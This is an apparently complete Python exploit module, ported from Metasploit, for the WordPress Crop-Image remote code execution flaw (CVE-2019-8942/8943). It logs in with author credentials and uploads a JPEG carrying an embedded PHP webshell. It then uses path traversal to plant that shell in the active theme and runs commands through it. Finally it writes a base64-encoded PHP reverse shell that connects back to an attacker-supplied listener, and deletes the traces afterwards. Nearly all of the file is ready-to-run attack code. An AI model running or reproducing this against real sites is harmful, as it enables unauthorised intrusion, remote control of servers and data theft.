"""Ghost Girl — WordPress Crop-Image RCE (CVE-2019-8942 / CVE-2019-8943).

Exploits a path traversal + local file inclusion in WordPress 5.0.0 and <= 4.9.8.
Requires author-level credentials.

Flow:
  1. Authenticate with WordPress
  2. Upload JPEG with PHP payload embedded in EXIF
  3. Crop image to create a new file
  4. Path traversal via _wp_attached_file meta to write shell into theme dir
  5. Create post using shell as page template (LFI)
  6. Trigger shell to get code execution

Translated from Metasploit: modules/exploits/multi/http/wp_crop_rce.rb
"""

import json
import random
import re
import string
import time

from tools.exploits.base import BaseExploit, ExploitError
from tools.lib.output import status, success, error, warning, data
from tools.lib.payloads import bash_revshell, php_system_webshell


def _rand_alpha(n=10):
    return ''.join(random.choices(string.ascii_lowercase, k=n))


# JPEG with PHP webshell in EXIF IPTC data — same as Metasploit module
# The PHP payload is: <?=`$_GET[0]`;?>  (embedded in IPTC and JPEG comment)
_IMG_HEX = (
    "FFD8FFE000104A46494600010101006000600000FFED003850686F"
    "746F73686F7020332E3000384249"
    "4D04040000000000001C1C027400"
    "103C3F3D60245F4745545B305D60"
    "3B3F3E1C020000020004FFFE003B"
    "435245415"
    "44F523A2067642D6A70656720763"
    "12E302028"
    "7573696E6720494A47204A504547"
    "2076383029"
    "2C207175616C697479203D203832"
    "0AFFDB0043"
    "000604040504040605050506060607090E0909080809120D0D0A0E"
    "15121616151214141A211C17181F1914141D271D1F222325252516"
    "1C292C28242B21242524FFDB00430106060609080911090911241814"
    "182424242424242424242424242424242424242424242424242424"
    "242424242424242424242424242424242424FFC000110800C00106"
    "03012200021101031101FFC4001F000001050101010101010100"
    "00000000000001020304050607080"
    "90A0BFFC400B510000201030302040305050504040000017D0102"
    "030004110512213141061351610722711432819"
    "1A10823"
    "42B1C11552D1F024336272820"
    "90A161718191A252627282"
    "92A343536373839"
    "3A434445464748494A535455565758595A636465666768696A7374"
    "75767778797A83848586878889"
    "8A92939495969798999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8"
    "B9BAC2C3C4C5C6C7C8C9CAD2D3D4D5D6D7D8D9DAE1E2E3E4E5"
    "E6E7E8E9EAF1F2F3F4F5F6F7F8F9FAFFC4001F010003010101"
    "01010101010100000000000102030405060708090A0BFFC400B5"
    "110002010204040304070504040001027700010203110405213106"
    "1241510761711322328108144291A1B1C10923335"
    "2F01562"
    "72D10A16243"
    "4E125F1171819"
    "1A262728292A3536373839"
    "3A434445464748494A535455565758595A636465666768696A7374"
    "75767778797A82838485868788898A9293949596979899"
    "9AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7"
    "C8C9CAD2D3D4D5D6D7D8D9DAE2E3E4E5E6E7E8E9EAF2F3F4F5"
    "F6F7F8F9FAFFDA000C03010002110311003F003C3F3D60245F47"
    "45545B305D603B3F3E"
)


def _get_payload_jpeg():
    """Build the JPEG with PHP in EXIF."""
    return bytes.fromhex(_IMG_HEX)


class WpCropRce(BaseExploit):
    name = "wp_crop_rce"
    description = "WordPress Crop-Image Shell Upload (CVE-2019-8942)"
    author = "ghost-girl (from Metasploit by RIPSTECH/Synacktiv)"
    references = ["CVE-2019-8942", "CVE-2019-8943"]

    options = {
        "RHOST": {"required": True, "description": "Target hostname or IP"},
        "RPORT": {"required": False, "description": "Target port", "default": "80"},
        "SSL": {"required": False, "description": "Use HTTPS", "default": False},
        "TARGETURI": {"required": False, "description": "WordPress base path", "default": "/"},
        "USERNAME": {"required": True, "description": "WordPress username (author+)"},
        "PASSWORD": {"required": True, "description": "WordPress password"},
        "THEME_DIR": {"required": False, "description": "Theme directory name (auto-detected if empty)"},
        "LHOST": {"required": True, "description": "Listener IP for reverse shell"},
        "LPORT": {"required": False, "description": "Listener port", "default": "4444"},
    }

    def __init__(self):
        super().__init__()
        self._cookie = None
        self._current_theme = None
        self._current_date = None
        self._shell_name = None
        self._filename1 = None
        self._backdoor = None
        self._post_id = None

    def _wp_url(self, path=""):
        """Build full WordPress URL."""
        base = self.target_url(self.get("TARGETURI") or "/")
        if base.endswith("/") and path.startswith("/"):
            path = path[1:]
        return base + path

    def _wp_login(self):
        """Authenticate to WordPress and get session cookies."""
        login_url = self._wp_url("/wp-login.php")
        resp = self.session.post(login_url, data={
            "log": self.get("USERNAME"),
            "pwd": self.get("PASSWORD"),
            "wp-submit": "Log In",
            "redirect_to": self._wp_url("/wp-admin/"),
            "testcookie": "1"
        }, allow_redirects=False)

        # WordPress sets cookies on successful login and redirects
        cookies = self.session.cookies.get_dict()
        if not any("wordpress_logged_in" in k for k in cookies):
            # Try following redirect — some setups need it
            if resp.status_code in (301, 302):
                self.session.get(resp.headers.get("Location", login_url))
                cookies = self.session.cookies.get_dict()

        if any("wordpress_logged_in" in k for k in cookies):
            return True
        return False

    def _get_wpnonce(self):
        """Get wpnonce from media-new.php."""
        resp = self.session.get(self._wp_url("/wp-admin/media-new.php"))
        match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', resp.text)
        if not match:
            # Try alternate pattern
            match = re.search(r'"_wpnonce":"([^"]+)"', resp.text)
        return match.group(1) if match else None

    def _get_wpnonce2(self, image_id):
        """Get wpnonce from post edit page."""
        resp = self.session.get(self._wp_url(f"/wp-admin/post.php?post={image_id}&action=edit"))
        # Find all hidden _wpnonce inputs
        nonces = re.findall(r'name="_wpnonce"\s+value="([^"]+)"', resp.text)
        # The second nonce is typically the one for editing
        if len(nonces) >= 2:
            return nonces[1]
        elif nonces:
            return nonces[0]
        return None

    def _get_ajax_nonce(self):
        """Get ajax nonce via query-attachments."""
        resp = self.session.post(self._wp_url("/wp-admin/admin-ajax.php"), data={
            "action": "query-attachments",
            "post_id": "0",
            "query[item]": "43",
            "query[orderby]": "date",
            "query[order]": "DESC",
            "query[posts_per_page]": "40",
            "query[paged]": "1"
        })
        match = re.search(r'"edit":"(\w+)"', resp.text)
        return match.group(1) if match else None

    def _get_current_theme(self):
        """Detect the active WordPress theme."""
        resp = self.session.get(self._wp_url("/"))
        match = re.search(r'/wp-content/themes/([\w-]+)/', resp.text)
        return match.group(1) if match else None

    def _upload_image(self, img_name, wp_nonce):
        """Upload the payload JPEG."""
        filename = img_name + ".jpg"
        img_data = _get_payload_jpeg()

        resp = self.session.post(
            self._wp_url("/wp-admin/async-upload.php"),
            data={
                "name": filename,
                "action": "upload-attachment",
                "_wpnonce": wp_nonce,
            },
            files={
                "async-upload": (filename, img_data, "image/jpeg")
            }
        )

        if resp.status_code != 200:
            raise ExploitError(f"Upload failed with status {resp.status_code}")

        result = resp.json()
        if not result.get("success") and "data" not in result:
            raise ExploitError(f"Upload failed: {result}")

        d = result.get("data", result)
        image_id = d["id"]
        filename = d["filename"]
        return filename, image_id

    def _image_editor(self, img_name, ajax_nonce, image_id):
        """Crop the image to create a new file."""
        resp = self.session.post(self._wp_url("/wp-admin/admin-ajax.php"), data={
            "action": "image-editor",
            "_ajax_nonce": ajax_nonce,
            "postid": str(image_id),
            "history": '[{"c":{"x":0,"y":0,"w":400,"h":300}}]',
            "target": "all",
            "context": "",
            "do": "save"
        })

        # Extract the cropped filename
        match = re.search(rf'({re.escape(img_name)}-\S+)-', resp.text)
        if not match:
            raise ExploitError("Failed to retrieve cropped filename from image-editor")
        return match.group(1) + ".jpg"

    def _change_path(self, wpnonce2, image_id, filename, path):
        """Modify _wp_attached_file via post.php to perform path traversal."""
        self.session.post(self._wp_url("/wp-admin/post.php"), data={
            "_wpnonce": wpnonce2,
            "action": "editpost",
            "post_ID": str(image_id),
            "meta_input[_wp_attached_file]": f"{self._current_date}{filename}{path}"
        })

    def _crop_image(self, image_id, ajax_nonce):
        """Trigger crop-image to write file at the traversed path."""
        resp = self.session.post(self._wp_url("/wp-admin/admin-ajax.php"), data={
            "action": "crop-image",
            "_ajax_nonce": ajax_nonce,
            "id": str(image_id),
            "cropDetails[x1]": "0",
            "cropDetails[y1]": "0",
            "cropDetails[width]": "400",
            "cropDetails[height]": "300",
            "cropDetails[dst_width]": "400",
            "cropDetails[dst_height]": "300"
        })
        return resp

    def _include_in_theme(self, shell_name):
        """Create a post that includes the shell via page template."""
        # Get new post page to extract nonce and post ID
        resp = self.session.get(self._wp_url("/wp-admin/post-new.php"))

        wpnonce = re.search(r'name="_wpnonce"\s+value="([^"]+)"', resp.text)
        post_id = re.search(r'"post":\{"id":(\d+)', resp.text)

        if not wpnonce or not post_id:
            raise ExploitError("Failed to get nonce/post_id from post-new.php")

        wpnonce = wpnonce.group(1)
        post_id = post_id.group(1)
        post_title = _rand_alpha(10)

        resp = self.session.post(self._wp_url("/wp-admin/post.php"), data={
            "_wpnonce": wpnonce,
            "action": "editpost",
            "post_ID": post_id,
            "post_title": post_title,
            "post_name": post_title,
            "meta_input[_wp_page_template]": f"cropped-{shell_name}.jpg"
        }, allow_redirects=False)

        if resp.status_code not in (200, 301, 302):
            raise ExploitError(f"Failed to create post (status {resp.status_code})")

        return post_id

    def _trigger_shell(self, post_id, command):
        """Execute a command through the webshell embedded in the post template."""
        resp = self.session.get(self._wp_url("/"), params={
            "p": post_id,
            "0": command
        })
        return resp.text

    def check(self):
        """Check if target is WordPress and credentials are valid."""
        try:
            # Check WordPress
            resp = self.session.get(self._wp_url("/wp-login.php"), timeout=10)
            if "wp-login" not in resp.text.lower():
                return False, "Target does not appear to be WordPress"

            # Check login
            if not self._wp_login():
                return False, f"Authentication failed for {self.get('USERNAME')}"

            return True, f"WordPress found, authenticated as {self.get('USERNAME')}"
        except Exception as e:
            return False, str(e)

    def exploit(self):
        """Execute the full exploit chain."""
        # Step 1: Authenticate
        status(f"Authenticating as {self.get('USERNAME')}...")
        if not self._wp_login():
            raise ExploitError(f"Authentication failed for {self.get('USERNAME')}")
        success("Authenticated with WordPress")

        # Step 2: Detect theme
        if self.get("THEME_DIR"):
            self._current_theme = self.get("THEME_DIR")
        else:
            status("Detecting active theme...")
            self._current_theme = self._get_current_theme()
            if not self._current_theme:
                raise ExploitError("Could not detect WordPress theme")
        success(f"Theme: {self._current_theme}")
        data("WP_THEME", self._current_theme)

        # Step 3: Get nonces and upload image
        status("Getting upload nonce...")
        wp_nonce = self._get_wpnonce()
        if not wp_nonce:
            raise ExploitError("Failed to get wpnonce from media-new.php")

        self._current_date = time.strftime("%Y/%m/")
        img_name = _rand_alpha(10)

        status("Uploading payload image...")
        filename, image_id = self._upload_image(img_name, wp_nonce)
        success(f"Image uploaded (id: {image_id})")

        # Step 4: Get ajax nonce and crop
        ajax_nonce = self._get_ajax_nonce()
        if not ajax_nonce:
            raise ExploitError("Failed to get ajax nonce")

        status("Cropping image...")
        self._filename1 = self._image_editor(img_name, ajax_nonce, image_id)

        # Step 5: Path traversal — first create intermediate file
        wpnonce2 = self._get_wpnonce2(image_id)
        if not wpnonce2:
            raise ExploitError("Failed to get wpnonce2 for path traversal")

        status("Performing path traversal (step 1 — intermediate)...")
        self._change_path(wpnonce2, image_id, self._filename1, "?/x")
        self._crop_image(image_id, ajax_nonce)

        # Step 6: Path traversal — write shell into theme directory
        self._shell_name = _rand_alpha(10)
        status(f"Performing path traversal (step 2 — writing to theme)...")
        self._change_path(
            wpnonce2, image_id, self._filename1,
            f"?/../../../../themes/{self._current_theme}/{self._shell_name}"
        )
        self._crop_image(image_id, ajax_nonce)
        success("Shell written to theme directory")

        # Step 7: Include shell via post template
        status("Including shell in theme via post template...")
        self._post_id = self._include_in_theme(self._shell_name)
        success(f"Post created (id: {self._post_id})")

        # Step 8: Verify code execution
        status("Verifying code execution...")
        test_output = self._trigger_shell(self._post_id, "echo ghost_girl_rce_confirmed")
        if "ghost_girl_rce_confirmed" in test_output:
            success("Code execution confirmed!")
            data("RCE_CONFIRMED", "true")
        else:
            warning("Could not confirm code execution (payload may still work)")

        # Step 9: Deploy reverse shell
        lhost = self.get("LHOST")
        lport = self.get("LPORT") or "4444"
        status(f"Triggering reverse shell to {lhost}:{lport}...")

        # Write a proper PHP reverse shell via the webshell
        self._backdoor = _rand_alpha(10)
        shell_code = (
            f"<?php $s=fsockopen('{lhost}',{lport});"
            f"$p=proc_open('/bin/bash',array(0=>$s,1=>$s,2=>$s),$pipes); ?>"
        )
        import base64
        encoded = base64.b64encode(shell_code.encode()).decode()

        self._trigger_shell(self._post_id, f"echo {encoded} | base64 -d > {self._backdoor}.php")
        # Small delay to ensure file is written
        time.sleep(1)

        # Trigger the reverse shell (non-blocking — it won't return)
        try:
            self.session.get(
                self._wp_url(f"/{self._backdoor}.php"),
                timeout=5
            )
        except Exception:
            pass  # Expected — the connection hangs while shell is open

        success(f"Reverse shell payload triggered → {lhost}:{lport}")
        data("SHELL_PAYLOAD", f"{self._backdoor}.php")

        return True, f"Shell delivered to {lhost}:{lport}"

    def cleanup(self):
        """Attempt to remove uploaded artifacts."""
        if not self._post_id:
            return
        status("Cleaning up artifacts...")
        try:
            if self._backdoor:
                self._trigger_shell(self._post_id, f"rm -f {self._backdoor}.php")
            if self._shell_name and self._current_theme:
                self._trigger_shell(
                    self._post_id,
                    f"rm -f wp-content/themes/{self._current_theme}/cropped-{self._shell_name}.jpg"
                )
            if self._filename1 and self._current_date:
                self._trigger_shell(
                    self._post_id,
                    f"rm -f wp-content/uploads/{self._current_date}{self._filename1[:10]}*"
                )
                self._trigger_shell(
                    self._post_id,
                    f"rm -f wp-content/uploads/{self._current_date}cropped-{self._filename1[:10]}*"
                )
            success("Cleanup attempted")
        except Exception as e:
            warning(f"Cleanup failed: {e}")
